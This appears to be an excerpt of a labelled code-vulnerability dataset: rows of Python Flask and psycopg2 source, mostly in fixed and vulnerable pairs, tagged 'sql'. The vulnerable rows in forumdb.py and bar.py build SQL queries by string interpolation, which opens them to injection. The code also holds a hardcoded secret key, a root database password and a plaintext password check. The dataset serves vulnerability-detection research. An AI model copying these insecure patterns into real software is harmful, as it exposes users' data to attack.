        self.user_id = str(response.get_json()['id'])

    def tearDown(self):
        # method to invoke after each test.
        pass
/n/n/n/app/answers/test/test_basics.py/n/n# APIs Testing

# Author: P8ul Kinuthia
# https://github.com/p8ul

import unittest
from .base import BaseTestCase


class FlaskTestCase(BaseTestCase):

    """""" Test List answers api """"""
    def test_list_answers(self):
        response = self.client.get(
            '/api/v1/questions/answers',
            headers={'Authorization': 'JWT ' + self.token}
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.get_json()['status'], 'success')

    """""" Test answers CRUD api """"""
    def test_post_update(self):
        """""" Initialize test data """"""
        data = {
            'title': 'Test title',
            'body': 'Test body',
            'answer_body': 'Test answer',
            'user': self.user_id
        }

        """""" Add test question""""""
        self.client.post(
            '/api/v1/questions/', json=data,
            headers={'Authorization': 'JWT ' + self.token}
        )

        response = self.client.get(
            '/api/v1/questions/',
            headers={'Authorization': 'JWT ' + self.token}
        )
        question_id = response.get_json().get('results')[0].get('question_id')

        """""" Test post answer """"""
        response = self.client.post(
            '/api/v1/questions/'+str(question_id)+'/answers', json=data,
            headers={'Authorization': 'JWT ' + self.token}
        )

        """""" Test status """"""
        self.assertEqual(response.status_code, 201)

        """""" Test if a question is created """"""
        self.assertEqual(response.get_json()['status'], 'success')


if __name__ == '__main__':
    unittest.main()
/n/n/n/app/auth/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify
from flask.views import MethodView
from ...models import Table
from ....utils import jwt_required, encode_auth_token

auth_blueprint = Blueprint('auth', __name__)


class RegisterAPI(MethodView):
    """"""
    User Signup API Resource
    """"""

    def post(self):
        # get the post data
        post_data = request.get_json(force=True)
        # check if user already exists
        user = Table.filter_by(post_data.get('email'))
        if not user:
            try:
                user = Table.save(data=post_data)
                # generate the auth token
                auth_token = encode_auth_token(user.get('id')).decode()
                response_object = {
                    'status': 'success',
                    'message': 'Successfully registered.',
                    'id': user.get('id'),
                    'auth_token': auth_token
                }
                return make_response(jsonify(response_object)), 201
            except Exception as e:
                print(e)
                response_object = {
                    'status': 'fail',
                    'message': 'Some error occurred. Please try again.'
                }
                return make_response(jsonify(response_object)), 401
        else:
            response_object = {
                'status': 'fail',
                'message': 'User already exists. Please Log in.',
            }
            return make_response(jsonify(response_object)), 202

    def delete(self, user_id=None):
        post_data = request.get_json(force=True)
        Table.delete(user_id, post_data)
        response_object = {
            'status': 'success',
            'message': 'User deleted successfully.',
        }
        return make_response(jsonify(response_object)), 200


class LoginAPI(MethodView):
    """""" User Login API Resource """"""
    def post(self):
        # get the post data
        post_data = request.get_json(force=True)
        try:
            # fetch the user data
            user = Table.filter_by(email=post_data.get('email'))
            if len(user) >= 1 and post_data.get('password'):
                if str(user[0][3]) == str(post_data.get('password')):
                    auth_token = encode_auth_token(user[0][0])
                else:
                    response_object = {
                        'status': 'fail',
                        'message': 'Password or email do not match.'
                    }
                    return make_response(jsonify(response_object)), 401
                try:
                    if auth_token:
                        response_object = {
                            'status': 'success',
                            'id': user[0][0],
                            'message': 'Successfully logged in.',
                            'auth_token': auth_token.decode()
                        }
                        return make_response(jsonify(response_object)), 200
                except Exception as e:
                    print(e)
                    return {""message"": 'Error decoding token'}, 401
            else:
                response_object = {
                    'status': 'fail',
                    'message': 'User does not exist.'
                }
                return make_response(jsonify(response_object)), 404
        except Exception as e:
            print(e)
            response_object = {
                'status': 'fail',
                'message': 'Try again'
            }
            return make_response(jsonify(response_object)), 500


class UserListAPI(MethodView):
    """""" User List Api Resource """"""
    @jwt_required
    def get(self, user_id=None):
        if user_id:
            user = Table.filter_by(email=None, user_id=user_id)
            if len(user) < 1:
                response_object = {
                    'results': 'User not found',
                    'status': 'fail'
                }
                return make_response(jsonify(response_object)), 404
            response_object = {
                'results': user,
                'status': 'success'
            }
            return (jsonify(response_object)), 200

        response_object = {
            'results': Table.query(),
            'status': 'success'
        }
        return (jsonify(response_object)), 200


class LogoutAPI(MethodView):
    """""" Logout Resource """"""
    def post(self):
        # get auth token
        auth_header = request.headers.get('Authorization')
        return auth_header


# Define the API resources
registration_view = RegisterAPI.as_view('register_api')
login_view = LoginAPI.as_view('login_api')
user_view = UserListAPI.as_view('user_api')
logout_view = LogoutAPI.as_view('logout_api')

# Add Rules for API Endpoints
auth_blueprint.add_url_rule(
    '/api/v1/auth/signup',
    view_func=registration_view,
    methods=['POST']
)

# Add Rules for API Endpoints
auth_blueprint.add_url_rule(
    '/api/v1/auth/delete',
    view_func=registration_view,
    methods=['DELETE']
)
auth_blueprint.add_url_rule(
    '/api/v1/auth/login',
    view_func=login_view,
    methods=['POST']
)
auth_blueprint.add_url_rule(
    '/api/v1/auth/users',
    view_func=user_view,
    methods=['GET']
)
auth_blueprint.add_url_rule(
    '/api/v1/auth/users/<string:user_id>',
    view_func=user_view,
    methods=['GET']
)
auth_blueprint.add_url_rule(
    '/api/v1/auth/logout',
    view_func=logout_view,
    methods=['POST']
)
/n/n/n/app/auth/test/test_model.py/n/nfrom .base import BaseTestCase
from ..models import Table


class FlaskTestCase(BaseTestCase):

    """""" Test signup api """"""
    def test_model_crud(self):
        # Test Create
        instance = Table.save(self.data)
        assert instance == self.data

        # Test query
        isinstance(Table.query(), type([]))
/n/n/n/app/comments/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify
from flask.views import MethodView
from ...models import Table
from ....utils import jwt_required

comments_blueprint = Blueprint('comments', __name__)


class ListAPIView(MethodView):
    """""" Update Instance api resource """"""

    @jwt_required
    def post(self, answer_id=None):
        post_data = request.get_json(force=True)
        response = Table.save(answer_id, data=post_data)
        if response:
            response_object = {
                'status': 'success',
                'message': 'Your comment was successful'
            }
            return make_response(jsonify(response_object)), 201

        response_object = {
            'status': 'fail',
            'message': 'Some error occurred. Please try again.'
        }
        return make_response(jsonify(response_object)), 400


# Define the API resources
comment_view = ListAPIView.as_view('comment_api')

# Add Rules for API Endpoints
comments_blueprint.add_url_rule(
    '/api/v1/questions/answers/comment/<string:answer_id>',
    view_func=comment_view,
    methods=['POST']
)
/n/n/n/app/migrations/db.py/n/nimport psycopg2
import psycopg2.extras

from .initial1 import migrations
from config import BaseConfig
from ..utils import db_config


class Database:
    def __init__(self, config):
        self.config = db_config(config)
        self.database = self.config.get('database')

    def test(self):
        con = psycopg2.connect(**self.config)
        con.autocommit = True

        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)
        cur.execute(""select * from pg_database where datname = %(database_name)s"", {'database_name': self.database})
        databases = cur.fetchall()
        if len(databases) > 0:
            print("" * Database {} exists"".format(self.database))
            for command in migrations:
                try:
                    cur.execute(command)
                    con.commit()
                except Exception as e:
                    print(e)
        else:
            print("" * Database {} does not exists"".format(self.database))
        con.close()


db = Database(BaseConfig.SQLALCHEMY_DATABASE_URI)
/n/n/n",1,sql
6,100,069700fb4beec79182fff3c556e9cccce3230d6f,"forumdb.py/n/n# ""Database code"" for the DB Forum.

import psycopg2
import datetime

def get_posts():
  """"""Return all posts from the 'database', most recent first.""""""
  conn = psycopg2.connect(""dbname=forum"")
  cursor = conn.cursor()
  cursor.execute(""select content, time from posts order by time desc"")
  all_posts = cursor.fetchall()
  conn.close()
  return all_posts

def add_post(content):
  """"""Add a post to the 'database' with the current timestamp.""""""
  conn = psycopg2.connect(""dbname=forum"")
  cursor = conn.cursor()
  one_post = content
  cursor.execute(""insert into posts values (%s)"", (one_post,))
  conn.commit()
  conn.close()
/n/n/n",0,sql
7,101,069700fb4beec79182fff3c556e9cccce3230d6f,"/forumdb.py/n/n# ""Database code"" for the DB Forum.

import psycopg2
import datetime

def get_posts():
  """"""Return all posts from the 'database', most recent first.""""""
  conn = psycopg2.connect(""dbname=forum"")
  cursor = conn.cursor()
  cursor.execute(""select content, time from posts order by time desc"")
  all_posts = cursor.fetchall()
  conn.close()
  return all_posts

def add_post(content):
  """"""Add a post to the 'database' with the current timestamp.""""""
  conn = psycopg2.connect(""dbname=forum"")
  cursor = conn.cursor()
  cursor.execute(""insert into posts values ('%s')"" % content)
  conn.commit()
  conn.close()
/n/n/n",1,sql
8,88,4bad3673debf0b9491b520f0e22e9186af78c375,"bar.py/n/nimport subprocess
import shlex
import os
import signal
from helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime
import json
from functools import wraps
from urllib.parse import urlparse

from flask import Flask, render_template, flash, redirect, url_for, session, request, logging
from flask_mysqldb import MySQL
from wtforms import Form, StringField, TextAreaField, PasswordField, validators
from passlib.hash import sha256_crypt
import time

app = Flask(__name__)
app.secret_key = 'Aj""$7PE#>3AC6W]`STXYLz*[G\gQWA'


# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'mountain'
app.config['MYSQL_DB'] = 'bar'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'

# init MySQL
mysql = MySQL(app)

# CONSTANTS
WGET_DATA_PATH = 'data'
PDF_TO_PROCESS = 10
MAX_CRAWLING_DURATION = 60 # 15 minutes
WAIT_AFTER_CRAWLING = 1000


# Helper Function

# Check if user logged in
def is_logged_in(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('Unauthorized, Please login', 'danger')
            return redirect(url_for('login'))
    return wrap


# Index
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute

        # User can type in url
        # The url will then get parsed to extract domain, while the crawler starts at url.

        # Get Form Fields and save
        url = request.form['url']
        parsed = urlparse(url)

        session['domain'] = parsed.netloc
        session['url'] = url

        # TODO use WTForms to get validation

        return redirect(url_for('crawling'))

    return render_template('home.html')


# Crawling
@app.route('/crawling')
@is_logged_in
def crawling():
    # STEP 0: TimeKeeping
    session['crawl_start_time'] = time.time()

    # STEP 1: Prepare WGET command
    url = session.get('url', None)

    command = shlex.split(""timeout %d wget -r -A pdf %s"" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove
    #command = shlex.split(""wget -r -A pdf %s"" % (url,))

    #TODO use celery
    #TODO give feedback how wget is doing

    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage

    # STEP 2: Execute command in subdirectory
    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)
    session['crawl_process_id'] = process.pid

    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)


# End Crawling Manual
@app.route('/crawling/end')
@is_logged_in
def end_crawling():

    # STEP 1: Kill crawl process
    p_id = session.get('crawl_process_id', None)
    os.kill(p_id, signal.SIGTERM)

    session['crawl_process_id'] = -1

    # STEP 2: TimeKeeping
    crawl_start_time = session.get('crawl_start_time', None)
    session['crawl_total_time'] = time.time() - crawl_start_time

    # STEP 3: Successful interruption
    flash('You successfully interrupted the crawler', 'success')

    return render_template('end_crawling.html')


# End Crawling Automatic
@app.route('/crawling/autoend')
@is_logged_in
def autoend_crawling():

    # STEP 0: Check if already interrupted
    p_id = session.get('crawl_process_id', None)
    if p_id < 0:
        return ""process already killed""
    else:
        # STEP 1: Kill crawl process
        os.kill(p_id, signal.SIGTERM)

        # STEP 2: TimeKeeping
        crawl_start_time = session.get('crawl_start_time', None)
        session['crawl_total_time'] = time.time() - crawl_start_time

        # STEP 3: Successful interruption
        flash('Time Limit reached - Crawler interrupted automatically', 'success')

        return redirect(url_for(""table_detection""))


# Start table detection
@app.route('/table_detection')
@is_logged_in
def table_detection():
    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)


# About
@app.route('/about')
def about():
    return render_template('about.html')


# PDF processing
@app.route('/processing')
@is_logged_in
def processing():

    # STEP 0: Time keeping
    proc_start_time = time.time()

    domain = session.get('domain', None)
    if domain == None:
        pass
        # TODO think of bad cases

    path = ""data/%s"" % (domain,)

    # STEP 1: Call Helper function to create Json string

    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..
    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works
    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work
    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either
    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3

    # FIXME remove all session stores

    # STEP 2: Call helper function to count number of pdf files
    n_files = path_number_of_files(path)
    session['n_files'] = n_files

    # STEP 3: Extract tables from pdf's
    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)

    # STEP 4: Save stats
    session['n_error'] = n_error
    session['n_success'] = n_success
    stats_json = json.dumps(stats, sort_keys=True, indent=4)
    session['stats'] = stats_json

    # STEP 5: Time Keeping
    proc_over_time = time.time()
    proc_total_time = proc_over_time - proc_start_time

    # STEP 6: Save query in DB
    # Create cursor
    cur = mysql.connection.cursor()

    # Execute query
    cur.execute(""""""INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, 
                stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)"""""",
                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json,
                stats_json, session.get('crawl_total_time', None), proc_total_time))

    # Commit to DB
    mysql.connection.commit()

    # Close connection
    cur.close()

    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)

# Last Crawl Statistics
@app.route('/statistics')
@is_logged_in
def statistics():
    # Create cursor
    cur = mysql.connection.cursor()

    # Get user by username
    cur.execute(""""""SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)"""""")

    result = cur.fetchone()

    # Close connection
    cur.close()

    if result:
        cid_last_crawl = result[""cid""]
        return redirect(url_for(""cid_statistics"", cid=cid_last_crawl))
    else:
        flash(""There are no statistics to display, please start a new query and wait for it to complete."", ""danger"")
        return redirect(url_for(""index""))


# CID specific Statistics
@app.route('/statistics/<int:cid>')
@is_logged_in
def cid_statistics(cid):

    # STEP 1: retrieve all saved stats from DB
    # Create cursor
    cur = mysql.connection.cursor()

    result = cur.execute(""""""SELECT * FROM Crawls WHERE cid = %s"""""", (cid,))
    crawl = cur.fetchall()[0]

    # Close connection
    cur.close();

    print(session.get('stats', None))
    print(crawl['stats'])

    # STEP 2: do some processing to retrieve interesting info from stats
    json_stats = json.loads(crawl['stats'])
    json_hierarchy = json.loads(crawl['hierarchy'])

    stats_items = json_stats.items()
    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])
    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])

    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])
    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])
    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])

    # Find some stats about creation dates
    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]
    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))

    if len(creation_dates) > 0:
        oldest_pdf = min(creation_dates)
        most_recent_pdf = max(creation_dates)
    else:
        oldest_pdf = ""None""
        most_recent_pdf = ""None""

    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],
                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],
                           small_tables=small_tables, medium_tables=medium_tables,
                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,
                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),
                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),
                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)


class RegisterForm(Form):
    name = StringField('Name', [validators.Length(min=1, max=50)])
    username = StringField('Username', [validators.Length(min=4, max=25)])
    email = StringField('Email', [validators.Length(min=6, max=50)])
    password = PasswordField('Password', [validators.DataRequired(),
                                          validators.EqualTo('confirm', message='Passwords do not match')])
    confirm = PasswordField('Confirm Password')


# Register
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm(request.form)
    if request.method == 'POST' and form.validate():
        name = form.name.data
        email = form.email.data
        username = form.username.data
        password = sha256_crypt.encrypt(str(form.password.data))

        # Create cursor
        cur = mysql.connection.cursor()

        # Execute query
        cur.execute(""INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)"",
                    (name, email, username, password))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        flash('You are now registered and can log in', 'success')

        return redirect(url_for('login'))

    return render_template('register.html', form=form)


# User login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get Form Fields
        username = request.form['username']
        password_candidate = request.form['password']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute(""""""SELECT * FROM Users WHERE username = %s"""""", [username])

        # Note: apparently this is safe from SQL injections see
        # https://stackoverflow.com/questions/7929364/python-best-practice-and-securest-to-connect-to-mysql-and-execute-queries/7929438#7929438

        if result > 0:
            # Get stored hash
            data = cur.fetchone() # FIXME why is username not primary key
            password = data['password']

            # Compare passwords
            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?

                # Check was successful -> create session variables
                session['logged_in'] = True
                session['username'] = username

                flash('You are now logged in', 'success')
                return redirect(url_for('index'))
            else:
                error = 'Invalid login'
                return render_template('login.html', error=error)

        else:
            error = 'Username not found'
            return render_template('login.html', error=error)

        # Close connection
        cur.close() # FIXME shouldn't that happen before return?

    return render_template('login.html')


# Delete Crawl
@app.route('/delete_crawl', methods=['POST'])
@is_logged_in
def delete_crawl():

        # Get Form Fields
        cid = request.form['cid']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute(""""""DELETE FROM Crawls WHERE cid = %s"""""" (cid,))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        # FIXME check if successfull first, return message
        flash('Crawl successfully removed', 'success')

        return redirect(url_for('dashboard'))


# Logout
@app.route('/logout')
@is_logged_in
def logout():
    session.clear()
    flash('You are now logged out', 'success')
    return redirect(url_for('login'))


# Dashboard
@app.route('/dashboard')
@is_logged_in
def dashboard():

    # Create cursor
    cur = mysql.connection.cursor()

    # Get Crawls
    result = cur.execute(""""""SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls"""""")

    crawls = cur.fetchall()

    if result > 0:
        return render_template('dashboard.html', crawls=crawls)
    else:
        msg = 'No Crawls Found'
        return render_template('dashboard.html', msg=msg)

    # Close connection FIXME is this code executed
    cur.close()


if __name__ == '__main__':
    app.secret_key='Aj""$7PE#>3AC6W]`STXYLz*[G\gQWA'
    app.run(debug=True)
    #app.run(host='0.0.0.0')

/n/n/n",0,sql
9,89,4bad3673debf0b9491b520f0e22e9186af78c375,"/bar.py/n/nimport subprocess
import shlex
import os
import signal
from helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime
import json
from functools import wraps
from urllib.parse import urlparse

from flask import Flask, render_template, flash, redirect, url_for, session, request, logging
from flask_mysqldb import MySQL
from wtforms import Form, StringField, TextAreaField, PasswordField, validators
from passlib.hash import sha256_crypt
import time

app = Flask(__name__)
app.secret_key = 'Aj""$7PE#>3AC6W]`STXYLz*[G\gQWA'


# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'mountain'
app.config['MYSQL_DB'] = 'bar'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'

# init MySQL
mysql = MySQL(app)

# CONSTANTS
WGET_DATA_PATH = 'data'
PDF_TO_PROCESS = 10
MAX_CRAWLING_DURATION = 60 # 15 minutes
WAIT_AFTER_CRAWLING = 1000


# Helper Function

# Check if user logged in
def is_logged_in(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('Unauthorized, Please login', 'danger')
            return redirect(url_for('login'))
    return wrap


# Index
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute

        # User can type in url
        # The url will then get parsed to extract domain, while the crawler starts at url.

        # Get Form Fields and save
        url = request.form['url']
        parsed = urlparse(url)

        session['domain'] = parsed.netloc
        session['url'] = url

        # TODO use WTForms to get validation

        return redirect(url_for('crawling'))

    return render_template('home.html')


# Crawling
@app.route('/crawling')
@is_logged_in
def crawling():
    # STEP 0: TimeKeeping
    session['crawl_start_time'] = time.time()

    # STEP 1: Prepare WGET command
    url = session.get('url', None)

    command = shlex.split(""timeout %d wget -r -A pdf %s"" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove
    #command = shlex.split(""wget -r -A pdf %s"" % (url,))

    #TODO use celery
    #TODO give feedback how wget is doing

    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage

    # STEP 2: Execute command in subdirectory
    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)
    session['crawl_process_id'] = process.pid

    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)


# End Crawling Manual
@app.route('/crawling/end')
@is_logged_in
def end_crawling():

    # STEP 1: Kill crawl process
    p_id = session.get('crawl_process_id', None)
    os.kill(p_id, signal.SIGTERM)

    session['crawl_process_id'] = -1

    # STEP 2: TimeKeeping
    crawl_start_time = session.get('crawl_start_time', None)
    session['crawl_total_time'] = time.time() - crawl_start_time

    # STEP 3: Successful interruption
    flash('You successfully interrupted the crawler', 'success')

    return render_template('end_crawling.html')


# End Crawling Automatic
@app.route('/crawling/autoend')
@is_logged_in
def autoend_crawling():

    # STEP 0: Check if already interrupted
    p_id = session.get('crawl_process_id', None)
    if p_id < 0:
        return ""process already killed""
    else:
        # STEP 1: Kill crawl process
        os.kill(p_id, signal.SIGTERM)

        # STEP 2: TimeKeeping
        crawl_start_time = session.get('crawl_start_time', None)
        session['crawl_total_time'] = time.time() - crawl_start_time

        # STEP 3: Successful interruption
        flash('Time Limit reached - Crawler interrupted automatically', 'success')

        return redirect(url_for(""table_detection""))


# Start table detection
@app.route('/table_detection')
@is_logged_in
def table_detection():
    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)


# About
@app.route('/about')
def about():
    return render_template('about.html')


# PDF processing
@app.route('/processing')
@is_logged_in
def processing():

    # STEP 0: Time keeping
    proc_start_time = time.time()

    domain = session.get('domain', None)
    if domain == None:
        pass
        # TODO think of bad cases

    path = ""data/%s"" % (domain,)

    # STEP 1: Call Helper function to create Json string

    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..
    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works
    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work
    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either
    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3

    # FIXME remove all session stores

    # STEP 2: Call helper function to count number of pdf files
    n_files = path_number_of_files(path)
    session['n_files'] = n_files

    # STEP 3: Extract tables from pdf's
    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)

    # STEP 4: Save stats
    session['n_error'] = n_error
    session['n_success'] = n_success
    stats_json = json.dumps(stats, sort_keys=True, indent=4)
    session['stats'] = stats_json

    # STEP 5: Time Keeping
    proc_over_time = time.time()
    proc_total_time = proc_over_time - proc_start_time

    # STEP 6: Save query in DB
    # Create cursor
    cur = mysql.connection.cursor()

    # Execute query
    cur.execute(""INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)"",
                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))

    # Commit to DB
    mysql.connection.commit()

    # Close connection
    cur.close()

    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)

# Last Crawl Statistics
@app.route('/statistics')
@is_logged_in
def statistics():
    # Create cursor
    cur = mysql.connection.cursor()

    # Get user by username
    cur.execute(""SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)"")

    result = cur.fetchone()

    # Close connection
    cur.close()

    if result:
        cid_last_crawl = result[""cid""]
        return redirect(url_for(""cid_statistics"", cid=cid_last_crawl))
    else:
        flash(""There are no statistics to display, please start a new query and wait for it to complete."", ""danger"")
        return redirect(url_for(""index""))


# CID specific Statistics
@app.route('/statistics/<int:cid>')
@is_logged_in
def cid_statistics(cid):

    # STEP 1: retrieve all saved stats from DB
    # Create cursor
    cur = mysql.connection.cursor()

    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)
    crawl = cur.fetchall()[0]

    # Close connection
    cur.close();

    print(session.get('stats', None))
    print(crawl['stats'])

    # STEP 2: do some processing to retrieve interesting info from stats
    json_stats = json.loads(crawl['stats'])
    json_hierarchy = json.loads(crawl['hierarchy'])

    stats_items = json_stats.items()
    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])
    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])

    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])
    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])
    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])

    # Find some stats about creation dates
    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]
    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))

    if len(creation_dates) > 0:
        oldest_pdf = min(creation_dates)
        most_recent_pdf = max(creation_dates)
    else:
        oldest_pdf = ""None""
        most_recent_pdf = ""None""

    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],
                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],
                           small_tables=small_tables, medium_tables=medium_tables,
                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,
                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),
                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),
                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)


class RegisterForm(Form):
    name = StringField('Name', [validators.Length(min=1, max=50)])
    username = StringField('Username', [validators.Length(min=4, max=25)])
    email = StringField('Email', [validators.Length(min=6, max=50)])
    password = PasswordField('Password', [validators.DataRequired(),
                                          validators.EqualTo('confirm', message='Passwords do not match')])
    confirm = PasswordField('Confirm Password')


# Register
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm(request.form)
    if request.method == 'POST' and form.validate():
        name = form.name.data
        email = form.email.data
        username = form.username.data
        password = sha256_crypt.encrypt(str(form.password.data))

        # Create cursor
        cur = mysql.connection.cursor()

        # Execute query
        cur.execute(""INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)"",
                    (name, email, username, password))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        flash('You are now registered and can log in', 'success')

        return redirect(url_for('login'))

    return render_template('register.html', form=form)


# User login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get Form Fields
        username = request.form['username'] # FIXME SQL_injection danger?
        password_candidate = request.form['password']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute(""SELECT * FROM Users WHERE username = %s"", [username])

        if result > 0:
            # Get stored hash
            data = cur.fetchone() # FIXME fucking stupid username is not primary key
            password = data['password']

            # Compare passwords
            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?

                # Check was successful -> create session variables
                session['logged_in'] = True
                session['username'] = username

                flash('You are now logged in', 'success')
                return redirect(url_for('index'))
            else:
                error = 'Invalid login'
                return render_template('login.html', error=error)

        else:
            error = 'Username not found'
            return render_template('login.html', error=error)

        # Close connection
        cur.close() # FIXME shouldn't that happen before return?

    return render_template('login.html')


# Delete Crawl
@app.route('/delete_crawl', methods=['POST'])
@is_logged_in
def delete_crawl():

        # Get Form Fields
        cid = request.form['cid']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute(""DELETE FROM Crawls WHERE cid = %s"" % cid)

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        # FIXME check if successfull first, return message
        flash('Crawl successfully removed', 'success')

        return redirect(url_for('dashboard'))


# Logout
@app.route('/logout')
@is_logged_in
def logout():
    session.clear()
    flash('You are now logged out', 'success')
    return redirect(url_for('login'))


# Dashboard
@app.route('/dashboard')
@is_logged_in
def dashboard():

    # Create cursor
    cur = mysql.connection.cursor()

    # Get Crawls
    result = cur.execute(""SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls"")

    crawls = cur.fetchall()

    if result > 0:
        return render_template('dashboard.html', crawls=crawls)
    else:
        msg = 'No Crawls Found'
        return render_template('dashboard.html', msg=msg)

    # Close connection FIXME is this code executed
    cur.close()


if __name__ == '__main__':
    app.secret_key='Aj""$7PE#>3AC6W]`STXYLz*[G\gQWA'
    app.run(debug=True)
    #app.run(host='0.0.0.0')

/n/n/n",1,sql
10,82,071497f90bcf7336c44e135d5ef4bd87898fa8d0,"app.py/n/n#!/usr/bin/env python2.7

import sys
import os

# Flask Import
from flask import Flask , request , redirect , render_template , url_for 
from flask import jsonify , abort , make_response 
import MySQLdb

# Toekn and URL check import
from check_encode import random_token , url_check
from display_list import list_data

from sql_table import mysql_table

# Config import
import config

# Import Loggers
import logging
from logging.handlers import RotatingFileHandler
from time import strftime
import traceback

